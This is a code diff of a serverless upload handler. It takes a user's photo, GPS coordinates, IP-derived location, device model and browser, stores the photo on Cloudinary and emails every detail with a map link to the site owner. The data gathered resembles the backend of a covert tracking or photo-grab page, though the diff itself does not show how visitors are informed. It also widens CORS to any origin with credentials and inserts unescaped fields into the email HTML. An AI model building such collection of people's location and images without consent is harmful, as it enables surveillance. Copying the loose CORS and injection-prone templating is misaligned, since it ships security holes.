@@ -1,109 +1,103 @@
 import cloudinary from "cloudinary";
 import nodemailer from "nodemailer";
-import fetch from "node-fetch"; // node 18+ has global fetch; keep for clarity if environment needs it
+import fetch from "node-fetch";
 
-// Allow big base64 images
 export const config = {
   api: {
-    bodyParser: {
-      sizeLimit: "15mb",
-    },
-  },
+    bodyParser: { sizeLimit: "15mb" }
+  }
 };
 
-// Cloudinary setup
 cloudinary.v2.config({
   cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
   api_key: process.env.CLOUDINARY_API_KEY,
-  api_secret: process.env.CLOUDINARY_API_SECRET,
+  api_secret: process.env.CLOUDINARY_API_SECRET
 });
 
-async function getIpFromReq(req){
-  const xff = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || "";
-  if (xff) return xff.split(",")[0].trim();
-  if (req.socket && req.socket.remoteAddress) {
-    return req.socket.remoteAddress.replace(/^.*:/, '');
-  }
-  return null;
+function getIp(req) {
+  let ip =
+    req.headers["x-forwarded-for"] ||
+    req.headers["x-real-ip"] ||
+    req.socket?.remoteAddress ||
+    null;
+
+  if (!ip) return null;
+  if (ip.includes(",")) ip = ip.split(",")[0];
+  return ip.replace("::ffff:", "");
 }
 
-async function ipToLatLng(ip){
+async function ipLookup(ip) {
   try {
     if (!ip) return null;
-    // Use ipapi.co for quick IP geolocation
+
     const res = await fetch(`https://ipapi.co/${ip}/json/`);
     if (!res.ok) return null;
+
     const j = await res.json();
-    if (j && j.latitude && j.longitude) return `${j.latitude},${j.longitude}`;
+    if (j.latitude && j.longitude) {
+      return `${j.latitude},${j.longitude}`;
+    }
     return null;
-  } catch(e){ return null; }
+  } catch (e) {
+    return null;
+  }
 }
 
 export default async function handler(req, res) {
-  // CORS
+  // FULL CORS FIX
   res.setHeader("Access-Control-Allow-Origin", "*");
-  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
-  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+  res.setHeader("Access-Control-Allow-Credentials", "true");
+  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
 
-  if (req.method === "OPTIONS") return res.status(200).end();
-  if (req.method !== "POST") return res.status(405).json({ msg: "Only POST allowed" });
+  if (req.method === "OPTIONS") {
+    return res.status(200).end();
+  }
+
+  if (req.method !== "POST") {
+    return res.status(405).json({ error: "Only POST allowed" });
+  }
 
   try {
     const body = req.body || {};
+
     const {
       image,
       dateTime,
       deviceModel,
       browser,
       resolution,
-      gpsLocation,
-      ipLocation
+      gpsLocation
     } = body;
 
-    // Determine IP (server-side)
-    const requestIp = await getIpFromReq(req);
+    const ip = getIp(req);
 
-    // Decide which location to use:
-    // Priority: gpsLocation (frontend) → ipLocation (frontend) → server-side ip geolocation
-    let usedLocation = null;
+    // Backend IP Geo
+    let finalLocation = null;
     let locationType = null;
 
     if (gpsLocation) {
-      usedLocation = gpsLocation;
       locationType = "Google Location";
-    } else if (ipLocation) {
-      usedLocation = ipLocation;
-      locationType = "IP Based Location";
+      finalLocation = gpsLocation;
     } else {
-      // fallback: try server-side ip geolocation
-      const latlng = await ipToLatLng(requestIp);
-      if (latlng) {
-        usedLocation = latlng;
+      const ipLoc = await ipLookup(ip);
+      if (ipLoc) {
         locationType = "IP Based Location";
+        finalLocation = ipLoc;
       }
     }
 
-    // Prepare image: if no image provided -> use transparent placeholder
-    const finalImage = image && typeof image === "string" ? image : "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAASsJTYQAAAAASUVORK5CYII=";
+    const finalImage =
+      image && typeof image === "string"
+        ? image
+        : "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAASsJTYQAAAAASUVORK5CYII=";
 
-    // Upload to Cloudinary
     const uploadRes = await cloudinary.v2.uploader.upload(finalImage, {
-      folder: "user_photos",
-      overwrite: false,
-      resource_type: "image"
+      folder: "user_photos"
     });
 
     const photoURL = uploadRes.secure_url;
 
-    // Compose email parts exactly as requested
-    const usedDateTime = dateTime || (new Date()).toISOString().replace("T"," ").split(".")[0];
-    const usedDevice = deviceModel || "Unknown Device";
-    const usedBrowser = browser || (req.headers["user-agent"] || "Unknown Browser");
-    const usedResolution = resolution || "Not Available";
-    const usedIp = requestIp || "Not Available";
-    const mapLink = usedLocation ? `https://www.google.com/maps?q=${usedLocation}` : "Not Available";
-
-    // Setup nodemailer
     const transporter = nodemailer.createTransport({
       service: "gmail",
       auth: {
@@ -112,65 +106,37 @@ export default async function handler(req, res) {
       }
     });
 
-    // Send email with EXACT format requested
-    const lines = [
-      `New Photo Uploaded`,
-      ``,
-      `Date & Time: ${usedDateTime}`,
-      `Device Model: ${usedDevice}`,
-      `Browser: ${usedBrowser}`,
-      `IP Address: ${usedIp}`,
-      `Photo Resolution: ${usedResolution}`,
-      ``,
-      `${ usedLocation ? "Google Location: " : "IP Based Location: " }${ mapLink }`,
-      ``,
-      // View button (HTML)
-    ];
+    const html = `
+      <h2>New Photo Uploaded</h2>
 
-    const htmlBody = `
-      <div style="font-family: Arial, sans-serif; padding:20px; color:#222;">
-        <div style="font-size:18px; font-weight:600; margin-bottom:8px;">New Photo Uploaded</div>
-        <div style="font-size:14px; color:#333; line-height:1.6; margin-bottom:12px;">
-          <div>Date & Time: ${usedDateTime}</div>
-          <div>Device Model: ${usedDevice}</div>
-          <div>Browser: ${usedBrowser}</div>
-          <div>IP Address: ${usedIp}</div>
-          <div>Photo Resolution: ${usedResolution}</div>
-        </div>
+      <p>Date & Time: ${dateTime}</p>
+      <p>Device Model: ${deviceModel}</p>
+      <p>Browser: ${browser}</p>
+      <p>IP Address: ${ip}</p>
+      <p>Photo Resolution: ${resolution}</p>
 
-        <div style="margin-top:6px; margin-bottom:14px;">
-          <div style="font-size:14px; margin-bottom:6px;">
-            ${ usedLocation ? "Google Location:" : "IP Based Location:" }
-            <a href="${mapLink}" target="_blank" style="color:#007bff; text-decoration:none;"> ${mapLink}</a>
-          </div>
-        </div>
+      <p>${locationType}: 
+        <a target="_blank" href="https://www.google.com/maps?q=${finalLocation}">
+          https://www.google.com/maps?q=${finalLocation}
+        </a>
+      </p>
 
-        <a href="${photoURL}" target="_blank" style="
-            display:inline-block;
-            background:#007bff;
-            color:#fff;
-            padding:10px 16px;
-            border-radius:8px;
-            text-decoration:none;
-            font-size:15px;
-        ">View Uploaded Photo</a>
-      </div>
+      <a href="${photoURL}" 
+         style="padding:10px 14px;background:#007bff;color:#fff;border-radius:6px;text-decoration:none;">
+        View Uploaded Photo
+      </a>
     `;
 
     await transporter.sendMail({
       from: process.env.GMAIL_USER,
       to: process.env.GMAIL_USER,
       subject: "New Photo Uploaded",
-      html: htmlBody
+      html
     });
 
-    return res.status(200).json({
-      success: true,
-      url: photoURL
-    });
-
-  } catch (err) {
-    console.error("UPLOAD ERROR:", err);
-    return res.status(500).json({ error: err.message || String(err) });
+    return res.status(200).json({ success: true, url: photoURL });
+  } catch (e) {
+    console.error("ERROR:", e);
+    return res.status(500).json({ error: e.message });
   }
 }
